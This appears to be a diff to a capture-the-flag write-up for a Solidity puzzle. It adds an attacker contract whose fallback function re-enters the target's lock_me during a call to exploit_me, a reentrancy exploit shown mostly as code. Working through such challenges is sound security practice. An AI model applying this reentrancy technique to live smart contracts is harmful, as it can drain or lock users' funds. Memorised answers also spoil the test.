@@ -64,5 +64,60 @@ contract Challenge {
 }
 ```
 
+# Attack Contract
+
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.13;
+
+import "../src/winner.sol";
+
+contract attackWinner {
+    bool public toggle;
+    Challenge public attack;
+
+    constructor(address _targetaddr) {
+        attack = Challenge(_targetaddr);
+    }
+
+    function bankai(string memory _name) external {
+        attack.exploit_me(_name);
+    }
+
+    fallback() external payable {
+        if (!toggle) {
+            toggle = true;
+            attack.lock_me();
+        }
+    }
+
+
+}
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
